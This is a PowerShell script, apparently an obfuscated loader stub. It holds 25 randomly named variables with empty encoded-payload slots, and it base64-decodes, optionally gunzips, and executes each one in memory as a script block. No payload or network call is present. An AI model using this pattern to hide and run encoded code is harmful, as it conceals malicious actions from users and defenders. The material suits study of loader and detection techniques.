#Requires -Version 2

$Quintuplet = ""
$Retardants = ""
$Autocratic = ""
$Misquoting = ""
$Excoriates = ""
$Aggression = ""
$Antiphonal = ""
$Escutcheon = ""
$Wonderland = ""
$Firstborns = ""
$Complained = ""
$Unleavened = ""
$Woodpecker = ""
$Oscillator = ""
$Camemberts = ""
$Dispirited = ""
$Simplifies = ""
$Metronomes = ""
$Invitation = ""
$Repressive = ""
$Toothpicks = ""
$Bratislava = ""
$Pestilence = ""
$Plastering = ""
$Thresholds = ""

$Modules = @($Quintuplet,$Retardants,$Autocratic,$Misquoting,$Excoriates,$Aggression,$Antiphonal,$Escutcheon,$Wonderland,$Firstborns,$Complained,$Unleavened,$Woodpecker,$Oscillator,$Camemberts,$Dispirited,$Simplifies,$Metronomes,$Invitation,$Repressive,$Toothpicks,$Bratislava,$Pestilence,$Plastering,$Thresholds)
$Modules | ForEach-Object {
    $Decoded = [System.Convert]::FromBase64String($_)
    if ($_ -like "H4s*") {
        $Decoded = ConvertFrom-Gzip -Bytes $Decoded
    }
    else {
        $Decoded = [Text.Encoding]::UTF8.GetString($Decoded)
    }
    $ScriptBlock = $ExecutionContext.InvokeCommand.NewScriptBlock($Decoded)
    . $ScriptBlock
}
